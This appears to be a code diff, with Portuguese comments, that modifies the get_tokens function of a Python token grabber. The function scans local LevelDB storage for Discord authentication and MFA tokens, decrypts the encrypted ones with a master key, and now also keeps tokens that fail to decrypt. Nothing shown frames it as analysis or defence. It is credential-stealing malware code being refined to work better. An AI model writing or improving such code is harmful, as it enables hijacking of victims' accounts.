@@ -1,3 +1,4 @@
+```python
 import os
 import re
 import subprocess
@@ -122,22 +123,32 @@ def get_tokens(path):
                         with open(os.path.join(lev_db, file_name), "r", errors='ignore') as files:
                             for line in files.readlines():
                                 line = line.strip()
-                                token_match = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
-                                mfa_match = re.findall(r'mfa\.[\w-]{84}', line) + re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25}', line)
+                                # Captura tokens de diferentes formatos
+                                token_match = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}', line)
+                                mfa_match = re.findall(r'mfa\.[\w-]{84}', line)
 
-                                for token in token_match:
+                                # Processa tokens padrão e tokens com estrutura MFA
+                                for token in token_match + mfa_match:
                                     try:
-                                        decrypted = decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
+                                        if 'dQw4w9WgXcQ:' in token:
+                                            # Tenta descriptografar tokens com prefixo específico
+                                            decrypted = decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
+                                        else:
+                                            # Se não houver prefixo, tenta descriptografar o token completo
+                                            decrypted = decrypt_token(b64decode(token), master_key)
+
                                         if decrypted:
                                             tokens.add(decrypted)
-                                            print(f"Token padrão descriptografado: {decrypted}")
+                                            print(f"Token descriptografado: {decrypted}")
+                                        else:
+                                            # Se não descriptografar, mas o token ainda for válido, adicione-o diretamente
+                                            tokens.add(token)
+                                            print(f"Token sem descriptografia adicionado: {token}")
                                     except Exception as e:
-                                        print(f"Erro ao descriptografar token padrão: {e}")
+                                        print(f"Erro ao tentar descriptografar o token: {e}")
+                                        tokens.add(token)  # Adiciona token mesmo em caso de erro na descriptografia
                                         continue
 
-                                for token in mfa_match:
-                                    tokens.add(token)
-                                    print(f"Token MFA encontrado: {token}")
                     except PermissionError as e:
                         print(f"Erro de permissão ao acessar {file_name}: {e}")
                         continue
